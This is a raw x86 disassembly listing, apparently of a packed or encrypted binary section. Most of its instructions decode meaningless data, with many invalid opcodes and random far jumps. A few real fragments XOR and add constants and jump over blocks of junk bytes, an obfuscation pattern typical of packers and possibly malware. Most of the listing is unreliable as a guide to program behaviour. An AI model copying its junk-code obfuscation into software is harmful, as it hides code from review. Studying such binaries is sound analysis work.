  41085d:	sar    DWORD PTR [ecx+0x120ebe46],0x3e
  410864:	(bad)  
  410865:	rcr    ebx,cl
  410867:	xor    al,0xd9
  410869:	pop    ebp
  41086a:	dec    eax
  41086b:	aam    0x59
  41086d:	sbb    al,0x9e
  41086f:	stos   BYTE PTR es:[edi],al
  410870:	xchg   BYTE PTR [ebp+0x6a],cl
  410873:	dec    ecx
  410874:	sub    ebx,eax
  410876:	sti    
  410877:	inc    ebx
  410878:	arpl   di,si
  41087a:	xchg   ebp,eax
  41087b:	(bad)  
  41087d:	ja     0x4108c8
  41087f:	aas    
  410880:	mov    es,WORD PTR [esi+0x2fb5cc4d]
  410886:	xchg   ebx,eax
  410887:	dec    edi
  410888:	jbe    0x410833
  41088a:	test   eax,0x3978bf56
  41088f:	pushf  
  410890:	xchg   DWORD PTR [esi],edi
  410892:	call   0x4abd:0x4b4795f
  410899:	push   ebx
  41089a:	int    0x57
  41089c:	cmp    eax,0x27
  41089f:	cmp    eax,0xea03a4b7
  4108a4:	sbb    BYTE PTR [edi-0x6d9a03f4],al
  4108aa:	mov    al,0xd7
  4108ac:	adc    edi,DWORD PTR [edi+0xd60a9da]
  4108b2:	fisttp WORD PTR [esi+0x6116d319]
  4108b8:	dec    esp
  4108b9:	(bad)  
  4108ba:	mov    dl,0x19
  4108bc:	mov    eax,0xa4c33c33
  4108c1:	push   edi
  4108c2:	sbb    eax,0x77eacf0b
  4108c7:	repz xor edi,esi
  4108ca:	pop    ss
  4108cb:	xchg   edi,eax
  4108cc:	stos   BYTE PTR es:[edi],al
  4108cd:	mov    cl,0x25
  4108cf:	sub    DWORD PTR [esi-0x2b4b5a4],edx
  4108d5:	push   eax
  4108d6:	lock pushf 
  4108d8:	jne    0x410933
  4108da:	xor    BYTE PTR [esi+ebx*2],bh
  4108dd:	pop    ebx
  4108de:	xor    DWORD PTR [eax+ebx*2+0x6d17ac13],edx
  4108e5:	dec    bp
  4108e7:	lds    ebx,FWORD PTR [eax-0x600989cc]
  4108ed:	jae    0x4108bd
  4108ef:	cmp    eax,0x8b8512a
  4108f4:	and    BYTE PTR [edx+0x5a42be26],0x23
  4108fb:	int    0x87
  4108fd:	mov    eax,ds:0x12470fad
  410902:	push   0xffffffec
  410904:	xor    BYTE PTR [esi-0x7ef0b1aa],dh
  41090a:	xchg   esi,eax
  41090b:	dec    esp
  41090c:	lods   al,BYTE PTR ds:[esi]
  41090d:	and    ecx,edx
  41090f:	inc    esi
  410910:	hlt    
  410911:	inc    edx
  410912:	dec    esp
  410913:	nop
  410914:	clc    
  410915:	push   esi
  410916:	sub    eax,0xf6039708
  41091b:	repz fsub DWORD PTR [ecx-0x167ef938]
  410922:	push   esp
  410923:	add    eax,0x8860a768
  410928:	push   0x498311df
  41092d:	shl    DWORD PTR [ecx],cl
  41092f:	sub    ebp,ebp
  410931:	int3   
  410932:	inc    edi
  410933:	xchg   al,ch
  410935:	arpl   si,bp
  410937:	pop    ebp
  410938:	rol    DWORD PTR [esi+0x5e],cl
  41093b:	add    DWORD PTR [ecx+0x166420bc],ecx
  410941:	sbb    al,0xab
  410943:	cmc    
  410944:	int    0xa7
  410946:	jecxz  0x4109ae
  410948:	icebp  
  410949:	add    al,0xa0
  41094b:	scas   al,BYTE PTR es:[edi]
  41094c:	pop    es
  41094d:	sar    DWORD PTR [edi],0x61
  410950:	pop    edx
  410951:	cmp    DWORD PTR [ebx-0x4f5922cc],0x1975215c
  41095b:	push   ebx
  41095c:	sbb    eax,0xb412f920
  410961:	mov    eax,DWORD PTR [ebx]
  410963:	int3   
  410964:	std    
  410965:	js     0x4108e9
  410967:	push   ebx
  410968:	dec    eax
  410969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41096a:	adc    al,0xaf
  41096d:	aas    
  41096e:	xchg   edx,eax
  41096f:	and    DWORD PTR [esi+edi*8-0x4c5664bb],edx
  410976:	push   cs
  410977:	(bad)  
  410978:	imul   ebx,DWORD PTR [edx+ebx*8+0x52],0x635479b1
  410980:	cdq    
  410981:	pushf  
  410982:	lods   eax,DWORD PTR ds:[esi]
  410983:	in     al,dx
  410984:	or     eax,0x3c2bdf25
  410989:	pop    eax
  41098a:	ret    0xf593
  41098d:	sub    al,0xbf
  41098f:	vmulss xmm3,xmm7,xmm6
  410993:	outs   dx,BYTE PTR ds:[esi]
  410994:	fnstenv [edi+0x3f]
  410997:	xchg   edi,eax
  410998:	adc    eax,0x8c434d15
  41099d:	add    BYTE PTR [ecx+0x116cd457],ch
  4109a3:	lds    esp,FWORD PTR [edi]
  4109a5:	jecxz  0x4109bc
  4109a7:	icebp  
  4109a8:	repz retf 
  4109aa:	jmp    0x410953
  4109ac:	les    ebx,FWORD PTR [edx+0x29fda77a]
  4109b2:	push   eax
  4109b3:	add    al,0x77
  4109b5:	jp     0x410946
  4109b7:	adc    DWORD PTR [ecx-0x9],0x4
  4109bb:	icebp  
  4109bc:	dec    BYTE PTR [ebx+0x92fff9e]
  4109c2:	lods   eax,DWORD PTR ds:[esi]
  4109c3:	or     ah,cl
  4109c5:	inc    ebp
  4109c6:	aaa    
  4109c7:	std    
  4109c8:	dec    esp
  4109c9:	pop    edi
  4109ca:	js     0x41098d
  4109cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109cd:	adc    al,0x83
  4109cf:	jmp    0x9382:0xbfdfa9fb
  4109d6:	adc    BYTE PTR [esi],al
  4109d8:	ror    BYTE PTR [esi+0x66],1
  4109db:	jg     0x41099c
  4109dd:	mov    cl,0x83
  4109df:	pop    esi
  4109e0:	jne    0x410985
  4109e2:	jl     0x4109a1
  4109e4:	mov    cs,WORD PTR [ebx-0x7f]
  4109e7:	mov    bl,0x89
  4109e9:	add    BYTE PTR [eax-0x5e],ah
  4109ec:	sbb    edi,0x1f6fe277
  4109f2:	push   esi
  4109f3:	rol    DWORD PTR [esi],0x36
  4109f6:	mov    DWORD PTR [ebx+0x25f9b469],ecx
  4109fc:	test   eax,0x847b026e
  410a01:	aas    
  410a02:	sbb    DWORD PTR ss:0x5431c8a2,ebx
  410a09:	stos   BYTE PTR es:[edi],al
  410a0a:	jnp    0x410a52
  410a0c:	lods   al,BYTE PTR ds:[esi]
  410a0d:	push   edx
  410a0e:	aas    
  410a0f:	iret   
  410a10:	ret    
  410a11:	leave  
  410a12:	push   ss
  410a13:	mov    BYTE PTR [edi+0x180590b3],ah
  410a19:	cwde   
  410a1a:	rol    DWORD PTR [ebp+0x22d242f3],0x8c
  410a21:	dec    eax
  410a22:	out    dx,eax
  410a23:	out    0xaf,eax
  410a25:	xor    ebp,DWORD PTR [esi-0x4d6d29e8]
  410a2b:	jle    0x410a08
  410a2d:	dec    eax
  410a2e:	fcom   st(4)
  410a30:	rcr    BYTE PTR [ecx-0x222cdd79],1
  410a36:	or     ah,0x2e
  410a39:	int3   
  410a3a:	fcom   QWORD PTR [esi+0x51]
  410a3d:	xchg   edx,eax
  410a3e:	test   eax,0x6c8d8335
  410a43:	add    DWORD PTR [ecx+edx*1-0x5c],esp
  410a47:	(bad)  
  410a48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a49:	retf   
  410a4a:	es push eax
  410a4c:	call   0x96d0:0x62f9cff8
  410a53:	mov    ebx,ebx
  410a55:	push   ecx
  410a56:	push   ebx
  410a57:	cmovno eax,DWORD PTR [eax]
  410a5a:	int    0x9
  410a5c:	addr16 dec eax
  410a5e:	mov    edi,0x66a19df7
  410a63:	or     al,0x16
  410a65:	xchg   BYTE PTR gs:[ebp-0x5f],al
  410a69:	cs jne 0x410a33
  410a6c:	gs jp  0x410ac8
  410a6f:	(bad)  
  410a70:	xchg   ecx,eax
  410a71:	je     0x410a70
  410a73:	push   eax
  410a74:	pop    es
  410a75:	out    dx,eax
  410a76:	xchg   edi,eax
  410a77:	sbb    ebp,DWORD PTR [edi]
  410a79:	aaa    
  410a7a:	and    bh,BYTE PTR [edx-0x31c681ca]
  410a80:	xlat   BYTE PTR ds:[ebx]
  410a81:	xrelease xchg DWORD PTR [ebp-0x1a],esi
  410a85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a86:	test   eax,0x93f938cb
  410a8b:	xchg   ecx,eax
  410a8c:	call   DWORD PTR [edx+ebp*1+0x65]
  410a90:	mov    cl,0x4c
  410a92:	mov    al,0xf4
  410a94:	out    dx,al
  410a95:	sbb    BYTE PTR [esi+0x33a89207],0xe0
  410a9c:	sbb    ah,BYTE PTR [ebx]
  410a9e:	mov    esi,0x67ded618
  410aa3:	jbe    0x410ab8
  410aa5:	mov    esi,0x3aa4b2d5
  410aaa:	and    eax,0x4eba6ef4
  410aaf:	mov    ds:0x557455af,eax
  410ab4:	fdiv   QWORD PTR fs:[ecx]
  410ab7:	lahf   
  410ab8:	pop    ds
  410ab9:	into   
  410aba:	mov    cl,0x16
  410abc:	loop   0x410a5d
  410abe:	aad    0xc8
  410ac0:	inc    edi
  410ac1:	scas   eax,DWORD PTR es:[edi]
  410ac2:	jg     0x410ada
  410ac4:	fcomp  QWORD PTR [ebx]
  410ac6:	fadd   QWORD PTR [ecx+0x62]
  410ac9:	add    al,0x2d
  410acb:	mov    ds:0xa76470de,al
  410ad0:	ret    
  410ad1:	jmp    0x89c7:0xab7aa096
  410ad8:	bt     DWORD PTR [ebx+ecx*1+0xb7d826f],esp
  410ae0:	mov    ebx,0xefa11333
  410ae5:	test   eax,0x22be43b1
  410aea:	sub    edi,DWORD PTR [edi-0x149d9ea4]
  410af0:	sub    bl,bh
  410af2:	je     0x410b11
  410af4:	div    BYTE PTR [ebx+0x65]
  410af7:	sbb    DWORD PTR [ebx+0x5690461d],ebx
  410afd:	imul   eax,DWORD PTR [eax],0xb4d7e21d
  410b03:	ins    BYTE PTR es:[edi],dx
  410b04:	dec    edx
  410b05:	les    esi,FWORD PTR ds:0xd5caa63f
  410b0b:	or     BYTE PTR [edx+0x25],dl
  410b0e:	icebp  
  410b0f:	cdq    
  410b10:	idiv   DWORD PTR [edi]
  410b12:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b14:	jecxz  0x410b75
  410b16:	sahf   
  410b17:	jecxz  0x410b67
  410b19:	loope  0x410b34
  410b1b:	scas   al,BYTE PTR es:[edi]
  410b1c:	addr16 xor al,0x2c
  410b1f:	cmp    dl,BYTE PTR [ecx-0x7]
  410b22:	cmp    DWORD PTR [edi+ecx*1-0x7f],esp
  410b26:	sbb    al,0x66
  410b28:	or     BYTE PTR [edx+eax*8-0x35],al
  410b2c:	ffreep st(3)
  410b2e:	repz mov dh,BYTE PTR [edi-0x68c5214e]
  410b35:	loop   0x410b4e
  410b37:	jae    0x410b7e
  410b39:	jne    0x410b00
  410b3b:	or     DWORD PTR [eax-0x1],esp
  410b3e:	mov    es,WORD PTR [esi]
  410b40:	daa    
  410b41:	ds nop
  410b43:	fs repz aas 
  410b46:	pusha  
  410b47:	(bad)  [esi-0x19]
  410b4a:	in     eax,0x10
  410b4c:	jno    0x410b2b
  410b4e:	jle    0x410b1c
  410b50:	lods   eax,DWORD PTR ds:[esi]
  410b51:	add    al,0xf4
  410b53:	sbb    DWORD PTR [ebx],ecx
  410b55:	jnp    0x410b76
  410b57:	or     eax,0xc4b5db13
  410b5c:	enter  0xaa9c,0xbd
  410b60:	sar    BYTE PTR [ecx],cl
  410b62:	inc    esi
  410b63:	push   esp
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz out 0x7b,al
  410ba6:	mov    dh,0x8c
  410ba8:	ds inc edx
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410bbb
  410bb1:	sbb    eax,0xd1e20996
  410bb6:	test   eax,0x20d025fc
  410bbb:	push   ds
  410bbc:	fisttp QWORD PTR [eax]
  410bbe:	adc    ch,BYTE PTR [edx]
  410bc0:	cs mov ah,0xef
  410bc3:	test   edx,esp
  410bc5:	jae    0x410c16
  410bc7:	loopne 0x410c3e
  410bc9:	mov    bl,0xb1
  410bcb:	cld    
  410bcc:	dec    eax
  410bcd:	fcmove st,st(4)
  410bcf:	jmp    0x8cc5:0x5306b603
  410bd6:	or     al,0xec
  410bd8:	or     ch,BYTE PTR [ecx]
  410bda:	mov    ebp,0x289cc3e3
  410bdf:	xor    eax,0xa868bb49
  410be4:	mov    BYTE PTR [ecx],al
  410be6:	sub    BYTE PTR [edx],bl
  410be8:	xchg   ebp,eax
  410be9:	leave  
  410bea:	push   ds
  410beb:	jmp    0x410c18
  410bed:	ja     0x410bee
  410bef:	leave  
  410bf0:	push   ebp
  410bf1:	jno    0x410c3e
  410bf3:	jbe    0x410c32
  410bf5:	inc    ebx
  410bf6:	cmp    eax,0xd0041869
  410bfb:	fst    QWORD PTR [ebx+ecx*4]
  410bfe:	imul   bh
  410c00:	add    eax,0xa3ab62ed
  410c05:	jnp    0x410be8
  410c07:	jnp    0x410c02
  410c09:	sbb    al,0x27
  410c0b:	mov    BYTE PTR [ebp+edi*4-0x64f22360],al
  410c12:	sub    BYTE PTR [edi+edi*8],ah
  410c15:	inc    esi
  410c16:	jno    0x410bbb
  410c18:	neg    DWORD PTR [esi]
  410c1a:	mov    dh,0xbb
  410c1c:	jg     0x410c02
  410c1e:	push   ecx
  410c1f:	shl    DWORD PTR [ebp+0xe9c39ec],0xca
  410c26:	es cld 
  410c28:	mov    ecx,0xd3be79bd
  410c2d:	addr16 pop ebp
  410c2f:	(bad)  
  410c31:	inc    edi
  410c32:	jae    0x410bf5
  410c34:	add    eax,0x55b40ed8
  410c39:	mov    ecx,0x2915990
  410c3e:	inc    esp
  410c3f:	test   eax,0x4fd66f2b
  410c44:	sub    ch,dl
  410c46:	xchg   ebp,eax
  410c47:	add    al,0x3e
  410c49:	jl     0x410cc3
  410c4b:	sbb    DWORD PTR [edx],ebx
  410c4d:	scas   al,BYTE PTR es:[edi]
  410c4e:	js     0x410c82
  410c50:	dec    ebx
  410c51:	aas    
  410c52:	(bad)  
  410c53:	(bad)  
  410c54:	popa   
  410c55:	sbb    edx,DWORD PTR [edx+0x20]
  410c58:	scas   eax,DWORD PTR es:[edi]
  410c59:	mov    cl,0xa2
  410c5b:	dec    edx
  410c5c:	imul   esp,DWORD PTR es:[esp+eax*4-0x30181bd9],0x22f6ff55
  410c68:	fincstp 
  410c6a:	scas   eax,DWORD PTR es:[edi]
  410c6b:	adc    bl,bl
  410c6d:	scas   eax,DWORD PTR es:[edi]
  410c6e:	out    0x2f,eax
  410c70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c71:	lock mov eax,ds:0x63bf8a80
  410c77:	adc    BYTE PTR ss:[esi],al
  410c7a:	out    0x9a,al
  410c7c:	ds aas 
  410c7e:	das    
  410c7f:	addr16 mov dl,0xca
  410c82:	push   edx
  410c83:	clc    
  410c84:	pushf  
  410c85:	aas    
  410c86:	icebp  
  410c87:	sub    eax,0xfe79c93a
  410c8c:	jns    0x410c26
  410c8e:	or     esi,DWORD PTR [ebp+0x57e82f51]
  410c94:	cli    
  410c95:	int3   
  410c96:	push   esi
  410c97:	jle    0x410cea
  410c99:	into   
  410c9a:	ficom  WORD PTR [ebp+esi*1+0x54]
  410c9e:	cmp    DWORD PTR [ecx+0x57d5ed32],esi
  410ca4:	fdiv   DWORD PTR [ebp+0x47]
  410ca7:	jl     0x410cb4
  410ca9:	mov    al,0xdb
  410cab:	lahf   
  410cac:	in     al,dx
  410cad:	jmp    0xf208:0xfdd7cb69
  410cb4:	imul   si,WORD PTR [ecx+0x5c52deb5],0xffe5
  410cbc:	xchg   edx,eax
  410cbd:	pop    ds
  410cbe:	out    dx,al
  410cbf:	inc    ebx
  410cc0:	fsubr  QWORD PTR [edi+0x66]
  410cc3:	clc    
  410cc4:	push   edx
  410cc5:	push   ecx
  410cc6:	rol    ebx,cl
  410cc8:	pop    es
  410cc9:	pop    ds
  410cca:	mov    ebx,DWORD PTR [esi+0x1b]
  410ccd:	adc    eax,0x7f8c55c1
  410cd2:	repz inc ebx
  410cd4:	daa    
  410cd5:	push   ss
  410cd6:	pop    ebx
  410cd7:	cmc    
  410cd8:	xchg   BYTE PTR ds:0xb929c1e8,bl
  410cde:	fild   DWORD PTR [ecx-0xee6c322]
  410ce4:	xchg   DWORD PTR [edx-0x30],edi
  410ce7:	add    bl,ah
  410ce9:	ss and eax,0xcc8cc6aa
  410cef:	popf   
  410cf0:	mov    edi,esi
  410cf2:	lea    esp,[edi]
  410cf4:	into   
  410cf5:	repnz imul dh
  410cf8:	test   BYTE PTR ds:0xb0fd1f96,ch
  410cfe:	(bad)  
  410cff:	and    ecx,DWORD PTR [ecx]
  410d01:	out    dx,eax
  410d02:	daa    
  410d03:	or     ecx,ebx
  410d05:	mov    esp,DWORD PTR ds:0xf84c4a0b
  410d0b:	stc    
  410d0c:	lods   al,BYTE PTR ds:[esi]
  410d0d:	ins    BYTE PTR es:[edi],dx
  410d0e:	sbb    al,0x93
  410d10:	jb     0x410d0a
  410d12:	fwait
  410d13:	clc    
  410d14:	stc    
  410d15:	repnz pop ss
  410d17:	in     al,0xb4
  410d19:	pusha  
  410d1a:	add    eax,0x5315524
  410d1f:	aad    0xc6
  410d21:	cdq    
  410d22:	pop    edi
  410d23:	enter  0x5b49,0x22
  410d27:	(bad)  
  410d29:	das    
  410d2a:	jge    0x410d3b
  410d2c:	mov    BYTE PTR [eax+ebx*2-0x42d673fe],al
  410d33:	jnp    0x410d87
  410d35:	push   esi
  410d36:	mov    DWORD PTR [ebp-0x38],0x7820395f
  410d3d:	in     al,dx
  410d3e:	outs   dx,DWORD PTR ds:[esi]
  410d3f:	(bad)  
  410d40:	(bad)  
  410d41:	mov    ds:0x339a267b,al
  410d46:	fwait
  410d47:	adc    eax,ecx
  410d49:	pop    es
  410d4a:	fwait
  410d4b:	loope  0x410da0
  410d4d:	bound  ecx,QWORD PTR [edx-0x33beb61a]
  410d53:	fmulp  st(3),st
  410d55:	pop    esi
  410d56:	shl    DWORD PTR [eax],0x9b
  410d59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d5a:	and    cl,ch
  410d5c:	imul   ebx,DWORD PTR [ebp+edi*2-0x5c35d488],0x2bc4c42a
  410d67:	add    edi,esi
  410d69:	(bad)  [eax+esi*8+0x1b937d53]
  410d70:	mov    ch,dh
  410d72:	and    ch,al
  410d74:	aad    0x52
  410d76:	mov    bl,0xe
  410d78:	cdq    
  410d79:	inc    ecx
  410d7a:	lods   eax,DWORD PTR ds:[esi]
  410d7b:	jns    0x410dc1
  410d7d:	xchg   edx,eax
  410d7e:	dec    ecx
  410d7f:	leave  
  410d80:	outs   dx,BYTE PTR ds:[esi]
  410d81:	scas   eax,DWORD PTR es:[edi]
  410d82:	xor    eax,0xaa97ddcb
  410d87:	jmp    0xe5609854
  410d8c:	scas   eax,DWORD PTR es:[edi]
  410d8d:	mov    bh,0xc7
  410d8f:	jp     0x410d65
  410d91:	dec    esi
  410d92:	(bad)  
  410d93:	dec    ecx
  410d94:	push   ebp
  410d95:	xchg   esp,eax
  410d96:	adc    edi,ebx
  410d98:	lock mov ah,0xde
  410d9b:	in     eax,0x9d
  410d9d:	jo     0x410d24
  410d9f:	cmp    WORD PTR ds:[edi],bx
  410da3:	(bad)  
  410da4:	mov    dl,0xb9
  410da6:	(bad)  
  410da7:	push   eax
  410da8:	xchg   BYTE PTR [esi+0x43057a76],dl
  410dae:	mov    cl,0xa
  410db0:	sbb    eax,0xa69f1c2d
  410db5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410db6:	ins    BYTE PTR es:[edi],dx
  410db7:	xor    edx,DWORD PTR [edx+0x438c3524]
  410dbd:	repz xchg ebp,eax
  410dbf:	cmp    BYTE PTR [edi-0x60d6d42e],dl
  410dc5:	mov    cl,BYTE PTR [edi+0x49]
  410dc8:	xor    al,0xf8
  410dca:	inc    ebp
  410dcb:	aad    0x21
  410dcd:	sub    DWORD PTR [eax-0x6b],eax
  410dd0:	xor    BYTE PTR [esi+esi*2],al
  410dd3:	inc    eax
  410dd4:	xchg   ebp,eax
  410dd5:	pop    ecx
  410dd6:	xchg   edx,eax
  410dd7:	inc    ebp
  410dd8:	xor    esp,DWORD PTR [ecx]
  410dda:	sar    BYTE PTR [eax],cl
  410ddc:	ds out 0x5c,al
  410ddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410de0:	ret    0xe789
  410de3:	xor    ah,BYTE PTR [ecx+0x6b]
  410de6:	pop    ds
  410de7:	mov    edx,ebx
  410de9:	add    al,BYTE PTR [bp+di+0x23ac]
  410dee:	outs   dx,BYTE PTR ds:[esi]
  410def:	push   eax
  410df0:	push   edx
  410df1:	xchg   ecx,eax
  410df2:	dec    edx
  410df3:	retf   
  410df4:	out    dx,eax
  410df5:	jbe    0x410d8f
  410df7:	sbb    bx,WORD PTR ds:0xe38a4ae
  410dfe:	stos   BYTE PTR es:[edi],al
  410dff:	pop    ecx
  410e00:	lock mov ecx,0x6783ba9
  410e06:	inc    esi
  410e07:	repz cdq 
  410e09:	dec    ebp
  410e0a:	and    eax,0x6ad724e7
  410e0f:	jecxz  0x410e72
  410e11:	sub    WORD PTR [ecx-0x4d],bx
  410e15:	dec    edx
  410e16:	add    BYTE PTR [esi+0x74],ah
  410e19:	inc    edi
  410e1a:	push   ebx
  410e1b:	and    dl,BYTE PTR [ebx-0x46]
  410e1e:	aad    0x66
  410e20:	out    dx,eax
  410e21:	inc    ebx
  410e22:	xchg   esi,eax
  410e23:	cmp    bh,al
  410e25:	xchg   ebx,eax
  410e26:	dec    eax
  410e27:	xchg   esp,eax
  410e28:	pop    ss
  410e29:	xchg   BYTE PTR ds:0xfa7543b4,ch
  410e2f:	sub    DWORD PTR [eax+eax*8-0x16bcc119],0x901e4298
  410e3a:	ret    
  410e3b:	mov    bh,0x7d
  410e3d:	scas   eax,DWORD PTR es:[edi]
  410e3e:	or     ebx,DWORD PTR [esi-0x7c8efaab]
  410e44:	jae    0x410e8c
  410e46:	jo     0x410eb4
  410e48:	pop    esi
  410e49:	data16 fisubr WORD PTR [edi-0x11c53f7b]
  410e50:	jmp    0x8bb0:0xd5b26a47
  410e57:	data16 aam 0x27
  410e5a:	(bad)  
  410e5b:	push   esi
  410e5c:	popf   
  410e5d:	ret    0xcf4c
  410e60:	push   0xdb67025e
  410e65:	shr    WORD PTR [ecx-0x6f9b981],1
  410e6c:	ror    DWORD PTR [ebx+0x5c089835],1
  410e72:	xchg   edx,eax
  410e73:	fstp   QWORD PTR [ebx-0x7a076049]
  410e79:	and    al,BYTE PTR [esi]
  410e7b:	push   ds
  410e7c:	(bad)  
  410e7d:	mov    ebp,0xa116636
  410e82:	mov    BYTE PTR [edi+0x1702485b],dl
  410e88:	push   DWORD PTR [ebp+0x3d78b75e]
  410e8e:	ret    
  410e8f:	dec    ebx
  410e90:	enter  0xc0d7,0x79
  410e94:	call   DWORD PTR [ebp-0x6f]
  410e97:	xchg   ebx,eax
  410e98:	outs   dx,BYTE PTR ds:[esi]
  410e99:	int    0x29
  410e9b:	mov    ebx,0x4f91eaf2
  410ea0:	fadd   QWORD PTR [edi]
  410ea2:	adc    dl,al
  410ea4:	fmul   DWORD PTR [edi+esi*4+0x1afe597e]
  410eab:	mov    edi,DWORD PTR [esi]
  410ead:	xchg   ch,cl
  410eaf:	icebp  
  410eb0:	fidivr DWORD PTR [edi+0x5024d8e9]
  410eb6:	xchg   edi,eax
  410eb7:	xor    BYTE PTR [esi-0x713dc1a5],dl
  410ebd:	push   0xffffffa6
  410ebf:	xchg   DWORD PTR [ebx+0x15a6ea37],esi
  410ec5:	sbb    eax,0xa2ece98e
  410eca:	push   cs
  410ecb:	mov    ds:0x903c99ab,eax
  410ed0:	xchg   DWORD PTR [edi-0x63],ebp
  410ed3:	pop    edx
  410ed4:	scas   eax,DWORD PTR es:[edi]
  410ed5:	push   edi
  410ed6:	fstp   QWORD PTR [edx]
  410ed8:	mov    ds:0xf7f6f124,al
  410edd:	mov    eax,0x33210d69
  410ee2:	call   0x9af8a9b6
  410ee7:	xor    ebp,esp
  410ee9:	push   0xe6524a9
  410eee:	clc    
  410eef:	hlt    
  410ef0:	cmp    BYTE PTR [ecx-0x93eacdc],dl
  410ef6:	pop    ebx
  410ef7:	addr16 cld 
  410ef9:	ret    0xcdb
  410efc:	adc    DWORD PTR [ebp+0xc],edx
  410eff:	mov    ds:0x2ddd23a1,al
  410f04:	jmp    0x1e11:0xb70d7103
  410f0b:	adc    ecx,edi
  410f0d:	push   edx
  410f0e:	adc    esp,0x58
  410f11:	xchg   ecx,eax
  410f12:	imul   eax,DWORD PTR [esi+eiz*2],0xfa8680b2
  410f19:	sti    
  410f1a:	nop
  410f1b:	mov    al,ds:0x8bd31de7
  410f20:	sar    DWORD PTR [ebx+0x7afd1853],cl
  410f26:	fisubr WORD PTR [ebp+0x3538aeda]
  410f2c:	or     al,0xf9
  410f2e:	stc    
  410f2f:	push   ss
  410f30:	ss and al,0x9d
  410f33:	inc    edx
  410f34:	xchg   ebx,eax
  410f35:	push   ebx
  410f36:	or     BYTE PTR [edx+ecx*1],dh
  410f39:	jno    0x410f4d
  410f3b:	mov    eax,ds:0xa803247a
  410f40:	xor    eax,0x5d79137c
  410f45:	bound  ebp,QWORD PTR [esi]
  410f47:	xor    eax,0xc3ac83ca
  410f4c:	int3   
  410f4d:	mov    ecx,0xe14ad1ea
  410f52:	xor    eax,0x2b13380d
  410f57:	(bad)
  410f5b:	int    0x57
  410f5d:	xchg   DWORD PTR [esi+0x2348a527],edx
  410f63:	adc    ah,ah
  410f65:	push   esp
  410f66:	dec    esp
  410f67:	xchg   ax,ax
  410f69:	sub    al,0xc8
  410f6b:	sbb    bl,cl
  410f6d:	jg     0x410f3c
  410f6f:	sub    BYTE PTR [edx-0x4a],dl
  410f72:	cmp    ebx,DWORD PTR [esi]
  410f74:	inc    esp
  410f75:	nop
  410f76:	mov    bh,0xe4
  410f78:	bound  ecx,QWORD PTR [ebx+ecx*8+0x1a51e71b]
  410f7f:	int3   
  410f80:	jbe    0x410f9a
  410f82:	adc    eax,0xac614519
  410f87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f88:	dec    ebp
  410f89:	pop    ecx
  410f8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f8b:	sub    esp,DWORD PTR [eax+ebx*8-0x4b]
  410f8f:	xlat   BYTE PTR ds:[ebx]
  410f90:	shl    BYTE PTR [edx],cl
  410f92:	push   eax
  410f93:	and    DWORD PTR [edi-0x5e014d0c],edx
  410f99:	sub    al,0xb2
  410f9b:	inc    ecx
  410f9c:	add    BYTE PTR [edx+0x32729c],bh
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fcee,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e09c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax-0x63514d98]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x411027
  410fdd:	je     0x410fe2
  410fdf:	or     eax,0x9c3e4180
  410fe4:	xor    ebx,DWORD PTR [eax+0x36]
  410fe7:	adc    BYTE PTR [ebx],ah
  410fe9:	mov    bl,0xb3
  410feb:	ja     0x410f9f
  410fed:	jg     0x411009
  410fef:	xlat   BYTE PTR ds:[ebx]
  410ff0:	aad    0x31
  410ff2:	or     eax,DWORD PTR [esi]
  410ff4:	pop    edi
  410ff5:	es mov esp,0x5eb0b9da
  410ffb:	mov    eax,ds:0x8780540f
  411000:	and    eax,0xc743fb46
  411005:	int    0xfc
  411007:	sbb    eax,0xe30cde67
  41100c:	inc    ebx
  41100d:	add    esi,DWORD PTR [esi]
  41100f:	std    
  411010:	popf   
  411011:	in     eax,dx
  411012:	aaa    
  411013:	xchg   ebx,eax
  411014:	jge    0x410fcc
  411016:	cld    
  411017:	ror    BYTE PTR [edx-0x1b],1
  41101a:	in     eax,0x25
  41101c:	mov    dl,0xe7
  41101e:	or     DWORD PTR [edx],0x51f6340c
  411024:	jae    0x411065
  411026:	aaa    
  411027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411028:	mov    eax,0x520fe1ec
  41102d:	sbb    al,0xc8
  41102f:	test   eax,0x5adde4d5
  411034:	ja     0x411014
  411036:	sub    eax,0x7f119562
  41103b:	mov    ah,0x90
  41103d:	push   edi
  41103e:	jmp    0x1438ba77
  411043:	jge    0x41104f
  411045:	jecxz  0x411075
  411047:	jno    0x410fd4
  411049:	ss dec ebp
